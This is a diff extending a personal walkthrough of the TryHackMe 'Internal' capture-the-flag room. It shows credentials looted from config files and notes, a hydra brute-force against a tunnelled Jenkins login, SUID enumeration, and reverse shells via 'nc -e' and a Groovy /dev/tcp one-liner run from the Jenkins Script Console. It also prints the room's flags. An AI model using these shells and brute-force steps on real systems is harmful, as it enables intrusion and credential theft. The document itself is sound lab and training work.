@@ -89,7 +89,7 @@ And on top I see `phpMyAdmin 4.6.6 documentation` , so I know the version too.
 
 I try to navigate on different pages that I got from gobuster, but I was getting errors.
 So I added internal.thm on the hosts file and after that I was able to find the pages.
-Next I find this `http://internal.thm/blog/wp-login.php`, which is a similar to [[CTF { Mr Robot }]] log-in form. So I try some default combinations and I get the required error on username:admin
+Next I find this `http://internal.thm/blog/wp-login.php`, which is a similar to [CTF { Mr Robot }](https://github.com/BabisSt/my-ctfs/blob/main/CTF%20%7B%20Mr%20Robot%20%7D.md) log-in form. So I try some default combinations and I get the required error on username:admin
 ```
 **Error**: The password you entered for the username **admin** is incorrect. [Lost your password?](http://internal.thm/blog/wp-login.php?action=lostpassword)
 ```
@@ -123,3 +123,177 @@ I open a netcat listener and then
 I navigate to `http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php`
 and catch the connection
 Under /home I find aubreanna directory but I can't cd in it.
+
+I look around and I find /etc/phpmyadmin folder
+I take a look inside
+```
+drwxr-xr-x   3 root root     4096 Aug  3  2020 .
+drwxr-xr-x 102 root root     4096 Aug  3  2020 ..
+-rw-r--r--   1 root root     2110 Jul 10  2017 apache.conf
+drwxr-xr-x   2 root root     4096 Jul 10  2017 conf.d
+-rw-r-----   1 root www-data  527 Aug  3  2020 config-db.php
+-rw-r--r--   1 root root      168 Jun 23  2016 config.footer.inc.php
+-rw-r--r--   1 root root      168 Jun 23  2016 config.header.inc.php
+-rw-r--r--   1 root root     6319 Jun 23  2016 config.inc.php
+-rw-r-----   1 root www-data    8 Aug  3  2020 htpasswd.setup
+-rw-r--r--   1 root root      646 Apr  7  2017 lighttpd.conf
+-rw-r--r--   1 root root      198 Jun 23  2016 phpmyadmin.desktop
+-rw-r--r--   1 root root      295 Jun 23  2016 phpmyadmin.service
+```
+
+config-db.php looks promising
+```
+<?php
+##
+## database access settings in php format
+## automatically generated from /etc/dbconfig-common/phpmyadmin.conf
+## by /usr/sbin/dbconfig-generate-include
+##
+## by default this file is managed via ucf, so you shouldn't have to
+## worry about manual changes being silently discarded.  *however*,
+## you'll probably also want to edit the configuration file mentioned
+## above too.
+##
+$dbuser='phpmyadmin';
+$dbpass='B2Ud4fEOZmVq';
+$basepath='';
+$dbname='phpmyadmin';
+$dbserver='localhost';
+$dbport='3306';
+$dbtype='mysql';
+```
+
+I see the creds above and I try to use them on the /phpmyadmin , and I login!
+There were a lot empty tables and I got stuck , so I had to look online for any clues
+On my netcat terminal I continued to look around and I found /opt/wp-save.txt
+```
+Bill,
+
+Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
+
+aubreanna:bubb13guM!@#123
+```
+
+So I have the creds for the aubreanna user. I su to it and find my first flag!
+`THM{int3rna1_fl4g_1}`
+
+## Priv Esc
+
+I sudo -l but I cant run it. So I `find / -perm -u=s -type f 2>/dev/null`
+
+```
+/snap/core/9665/bin/mount
+/snap/core/9665/bin/ping
+/snap/core/9665/bin/ping6
+/snap/core/9665/bin/su
+/snap/core/9665/bin/umount
+/snap/core/9665/usr/bin/chfn
+/snap/core/9665/usr/bin/chsh
+/snap/core/9665/usr/bin/gpasswd
+/snap/core/9665/usr/bin/newgrp
+/snap/core/9665/usr/bin/passwd
+/snap/core/9665/usr/bin/sudo
+/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9665/usr/lib/openssh/ssh-keysign
+/snap/core/9665/usr/lib/snapd/snap-confine
+/snap/core/9665/usr/sbin/pppd
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/bin/mount
+/bin/umount
+/bin/ping
+/bin/fusermount
+/bin/su
+/usr/bin/traceroute6.iputils
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+I also found a jenkins.txt file
+`Internal Jenkins service is running on 172.17.0.2:8080`
+
+I can't access it directly from my browser so I found online something like this
+`ssh -L 4444:172.17.0.2:8080 aubreanna@internal.thm`
+Now if I type localhost:4444 on my browser I can access a Jenkins login page.
+
+I don't have the creds to login, so I need to bruteforce it either with burpsuite or hydra. I will do it with hydra like that:
+
+```
+ydra -l admin -P /usr/share/wordlists/rockyou.txt -s 4444 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&form=%2F&Submit=Sign+in&Login=Login:Invalid username or password' 
+```
+
+- I am using admin as a default username and I am looking for the password. 
+- -s 4444 because thats my localhost port
+- I know its a http-post-form
+- I get this `/j_acegi_security_check` from the captured burpsuite request
+- I also get these from burpsuite `j_username=admin&j_password=ok&from=%2F&Submit=Sign+in`
+
+And after some time I have the password : spongebob
+
+I get in and try to find a project to run a reverse shell , but I cant find one.
+So I navigate to
+Jenkins -> Manage Jenkins -> Script Console
+Here I can run my reverse shell.
+I open a netcat listener and I try this oneliner for the shell
+`nc -e /bin/sh [local ip] 1234`, but I get a lot of errors such as :
+
+`at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:129)`
+I see eclipse so I know its java, so I try this reverse shell instead: 
+
+```
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[local ip]/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+And it works!
+
+I try to spawn a more stable shell with
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+but I cant so I try this instead
+`/bin/bash -i`
+
+So now I have to find the flag so I try something like this
+`find / -name flag 2> /dev/null`, or with user or something else but I get nothing
+Instead I broaden my scope with
+`find / -name *.txt`
+There are a lot of results, but there is an interesting /opt/note.txt
+```
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+
+```
+
+And there I have it!
+I login and I take my flag `THM{d0ck3r_d3str0y3r}`
